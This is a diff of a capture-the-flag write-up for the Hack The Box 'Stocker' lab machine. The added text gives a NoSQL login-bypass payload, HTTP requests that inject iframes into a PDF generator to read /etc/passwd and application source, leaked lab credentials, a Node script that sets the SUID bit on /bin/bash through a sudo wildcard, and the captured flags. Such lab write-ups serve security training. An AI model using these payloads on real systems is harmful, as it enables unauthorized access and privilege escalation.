@@ -1,15 +1,15 @@
 ---
-title: "HTB: Stocker"
+title: "HTB Writeup: Stocker"
 slug: "stocker"
 date: 2023-04-01T22:23:25-04:00
-draft: true     
-summary: "Writeup for the Hack The Box – [Stocker](https://app.hackthebox.com/machines/523)"     
-description: "Writeup for the Hack The Box – Stocker" 
+draft: false     
+summary: "Writeup for Hack The Box – [Stocker](https://app.hackthebox.com/machines/523)"     
+description: "Writeup for Hack The Box – Stocker" 
 categories: ["htb"] 
-tags: []
+tags: ["xss", "nosql"]
 keywords: ["htb","hackthebox","stocker"]   
 cover:
-    image: ""
+    image: "images/Stocker.png"
 ---
 
 ## Stocker
@@ -124,7 +124,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 ```
 
-`/stock` seems interesting. Hopefully we can bypass the login to get access.
+`/stock` seemed interesting.
 
 ### sqlmap
 `dev.stocker.htb` took me to a login page. I tried a few random default passwords with no luck. Then I threw `sqlmap` at it to see if SQLi would work here.
@@ -139,12 +139,159 @@ This didn't have any luck.
 ### burpsuite
 [HackTricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass) NoSQL Injection section to the rescue.
 
+```sh
+{"username": {"$ne": null}, "password": {"$ne": null} }
+```
+
 ![burp](images/burp.png "Successful authentication bypass")
 
 ![stock](images/stock.png "Browser view of gained access to `dev.stocker.htb/stock`")
 
+After monitoring these requests with `burp`, I realized malicious `iframe`'s can be used to pull information from the server such as `/etc/passwd`:
+```http
+POST /api/order HTTP/1.1
+Host: dev.stocker.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://dev.stocker.htb/stock
+Content-Type: application/json
+Origin: http://dev.stocker.htb
+Content-Length: 225
+Connection: close
+Cookie: connect.sid=
+s%3ADTAH3L2HfmT2Cn6zhHfOfyr18Jes4y_c.rWc8wNthMi0JSQbkmNXfQid2y2ySv0JnmPglTMKjUmI
+
+{
+    "basket":[
+        {
+            "_id":"638f116eeb060210cbd83a8f",
+            "title":"<iframe src=file:///etc/passwd height=750px width=750px</iframe>",
+            "description":"It's a rubbish bin.",
+            "image":"bin.jpg",
+            "price":76,
+            "currentStock":15,
+            "__v":0,
+            "amount":1
+        }
+    ]
+}
+```
+
+The server replies with: 
+```http
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Sun, 02 Apr 2023 18:50:21 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 53
+Connection: close
+X-Powered-By: Express
+ETag: W/"35-haqxAbz2IXEyESkOv8R4XgQqfnw"
+
+{
+    "success":true,
+    "orderId":"6429d02b9cf17ad01a93e155"
+}
+```
+
+Finally, I checked the PDF receipt with the `orderId` the API generates to see the output.
+
+![receipt](images/receipt.i.png "Receipt: http://dev.stocker.htb/api/po/6429d02b9cf17ad01a93e155")
+
+I repeated these steps to locate the javascript source code.
+
+*Request:*
+```http
+POST /api/order HTTP/1.1
+Host: dev.stocker.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://dev.stocker.htb/stock
+Content-Type: application/json
+Origin: http://dev.stocker.htb
+Content-Length: 225
+Connection: close
+Cookie: connect.sid=
+s%3ADTAH3L2HfmT2Cn6zhHfOfyr18Jes4y_c.rWc8wNthMi0JSQbkmNXfQid2y2ySv0JnmPglTMKjUmI
+
+{
+    "basket":[
+        {
+            "_id":"638f116eeb060210cbd83a8f",
+            "title":"<iframe src=file:///var/www/dev/index.js height=750px width=750px</iframe>",
+            "description":"It's a rubbish bin.",
+            "image":"bin.jpg",
+            "price":76,
+            "currentStock":15,
+            "__v":0,
+            "amount":1
+        }
+    ]
+}
+```
+
+*Response:*
+```http
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Sun, 02 Apr 2023 19:06:33 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 53
+Connection: close
+X-Powered-By: Express
+ETag: W/"35-oWX982b+eWRapIaO22T+EspEwGI"
+
+{
+    "success":true,
+    "orderId":"6429d2399cf17ad01a93e15a"
+}
+```
+
+![index.js](images/index.js.i.png)
+
+Creds acquired!
+
+```
+angoose@10.10.11.196 | IHeardPassphrasesArePrettySecure
+```
+
+### privesc
+Initial triage showed `angoose` has `sudo` privs for running `/usr/bin/node` on the path `/usr/local/scripts/*.js`. I took advantage of this wild card and wrote a malicious `esc.js` to make `/bin/bash` have the `SETUID` bit.
+
+```sh
+angoose@stocker:~$ sudo -l
+[sudo] password for angoose:
+Matching Defaults entries for angoose on stocker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User angoose may run the following commands on stocker:
+    (ALL) /usr/bin/node /usr/local/scripts/*.js
+```
+
+*file: esc.js*
+```js
+const { exec } = require("child_process");
+exec("chmod u+s /bin/bash", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
+```
+
+![root](images/root.png "pwned")
+
 ### Flags
 
-**user.txt:** ``
+**user.txt:** `35ead2014cf3831c2b46a6d7108f48f1`
 
-**root.txt:** ``
+**root.txt:** `8e386772be19262c050d62534c53ee1d`
